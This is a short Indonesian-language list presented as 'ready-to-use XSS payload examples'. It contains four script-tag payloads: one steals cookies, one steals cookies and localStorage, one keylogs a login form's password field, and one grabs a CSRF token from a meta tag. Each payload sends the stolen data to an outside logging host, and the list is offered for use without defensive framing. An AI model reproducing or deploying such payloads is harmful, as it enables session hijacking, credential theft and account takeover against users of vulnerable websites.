🚀 Contoh Payload XSS Siap Pakai

1. Curi cookie (Image method - stealth):

<script>new Image().src='https://xss-exfil-logger.vercel.app/log?cookie='+document.cookie</script>

2. Curi cookie + localStorage (Fetch):

<script>fetch('https://xss-exfil-logger.vercel.app/log?data='+btoa(JSON.stringify({c:document.cookie,l:localStorage})));</script>

3. Keylogger sederhana untuk form login:

<script>document.getElementById('password').addEventListener('keyup',function(e){new Image().src='https://xss-exfil-logger.vercel.app/log?key='+e.target.value});</script>

4. Curi session token dari meta tag:

<script>new Image().src='https://xss-exfil-logger.vercel.app/log?token='+document.querySelector('meta[name="csrf-token"]').content</script>
